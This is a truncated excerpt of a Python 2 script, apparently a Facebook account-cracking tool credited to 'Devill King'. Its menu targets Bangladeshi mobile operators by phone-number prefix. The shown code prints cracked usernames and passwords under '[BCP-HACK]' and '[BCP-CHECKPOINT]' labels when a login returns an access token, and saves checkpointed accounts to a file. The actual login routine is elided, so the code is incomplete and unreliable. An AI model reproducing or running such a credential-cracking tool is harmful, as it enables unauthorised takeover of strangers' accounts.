...
logo = '\x1b[1;97m--------------------------------------------------\n      ---> Create to by -> Devill King <--- \n\x1b[1;97m-------------------------------------------------- \n\x1b[1;97m     Facebook  -> Sajol \x1b[00m\n\x1b[1;97m--------------------------------------------------\n    ---> Github -> Sojol Khan <--- \n\x1b[1;97m--------------------------------------------------'
...
def menu():
    ...
    print
    '\x1b[1;91mAUTHOR  : Devill King'
    print
    '\x1b[1;91mFACEBOOK  : Devill King'
    print
    '\x1b[1;91mGITHUB  : github.com/sojolkhan'
    print
    ''
    print
    50 * '-'
    ...
    print
    print
    '\x1b[1;91mBANGLADESH ALL OPERETOR NETWORK'
    print
    print
    '\x1b[1;92m[1]  ROBI (BCP)'
    print
    '\x1b[1;92m[2]  AIRTEL(BCP)'
    print
    '\x1b[1;92m[3]  BANGLALINK(OLD)'
    print
    '\x1b[1;92m[4]  BANGLALINK(NEW)'
    print
    '\x1b[1;92m[5]  GRAMEEN(BCP)'
    print
    '\x1b[1;92m[6]  TELETALK(BCP)'
    print
    '\x1b[1;92m[7]  EXIT'
    print
    '\x1b[1;92m[0]  EXIT'
...
def action():
    ...
    if bch == '':
        ...
        ''
        print
        '170,171, 172, 173, 174, 175, 176, 177, 178, 179,130'
        print
        ...
        ''
        print
        '190,191, 192, 193, 194, 195, 196, 197, 198, 199,140'
        print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print
                '\x1b[1;92m[BCP-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print
                '\x1b[1;93m[BCP-CHECKPOINT]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
    ...
    print
    '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 Devillking.py')
